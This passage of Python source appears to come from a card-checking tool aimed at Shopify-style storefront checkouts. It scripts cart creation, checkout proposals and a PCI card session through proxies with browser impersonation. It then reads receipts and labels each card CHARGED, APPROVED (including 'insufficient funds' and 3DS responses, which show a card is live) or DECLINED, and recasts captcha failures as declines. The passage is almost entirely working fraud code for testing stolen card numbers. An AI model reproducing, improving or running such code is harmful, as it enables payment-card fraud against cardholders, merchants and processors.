            result.error = Exception(f"Step 0 failed: {e}")
            return result
        
        # Step 1 - Add to cart and get checkout
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result
        
        # Step 2 - Get private access token
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result
        
        # Step 3 - Get actions JS and extract IDs
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
            if not poll_for_receipt_id:
                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result
        
        # Step 4 - First proposal
        try:
            _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                              stable_id, variant_id, price, proposal_id, build_id, source_token,
                                              currency, country)
            
            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            
            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price
            
            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result
        
        # Step 5 - Second proposal with email
        try:
            _, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result
        
        # Step 6 - Third proposal with address
        try:
            addr = address_for_country(country)
            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result
        
        # Step 7 - Fourth proposal
        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result
        
        # Step 8 - Fifth proposal
        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result
        
        # Step 9 - PCI Session
        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")
            
            pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                     card_month, card_year, card_cvv, site_name, proxy_url,
                                                     impersonate=client.impersonate)
            _ = pci_status
            
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                result.retryable = True
                raise Exception("could not extract session ID")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result
        
        # Step 10 - Submit for completion
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)

            delivery_handle, dh_shipping = extract_delivery_from_proposal(proposal5_body)
            if not delivery_handle:
                delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)

            shipping_amount = dh_shipping or extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount
            cover_any = False

            MAX_TAX_RETRIES = 6
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax,
                    total_any=cover_any
                )

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    continue

                if ("WAITING_PENDING_TERMS" in submit_body
                        or "Waiting for pending terms" in submit_body):
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    time.sleep(extract_pending_poll_delay(submit_body))
                    continue

                if "cannot cover the total amount" in submit_body and not cover_any:
                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
                    if corrected_total and float(corrected_total) > 0:
                        current_total = corrected_total
                        if corrected_tax:
                            current_tax = corrected_tax
                    else:
                        cover_any = True
                    continue
                break

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    result.status = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error = Exception(error_msg)
                    result.retryable = any(keyword in error_msg.lower() for keyword in ['inventory', 'retry', 'try again', 'generic'])
                else:
                    result.status = CheckStatus.ERROR
                    result.error = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal5_body, submit_body)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result
        
        # Step 11 - Poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
        
        for poll_num in range(1, 31):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )
                
                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)
                
                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code
                
                # ── Handle ProcessingReceipt ──────────────────────────
                if receipt_type == "ProcessingReceipt":
                    result.status = CheckStatus.APPROVED  # أو CheckStatus.PROCESSING لو ضفته
                    result.status_code = "PROCESSING"
                    result.receipt_url = checkout_url
                    return result
                
                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PAID"
                    try:
                        poll_json = json.loads(poll_body)
                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
                        conf_url = receipt_obj.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = conf_url or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result
                
                if receipt_type == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_REQUIRED"
                    return result
                
                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"
                    
                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error = Exception(f"{error_code}")
                        return result
                
                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)
                
            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {poll_num} failed: {e}")
                return result
        
        result.status = CheckStatus.ERROR
        result.error = Exception("exceeded 30 poll attempts")
        return result
        
    finally:
        client.close()
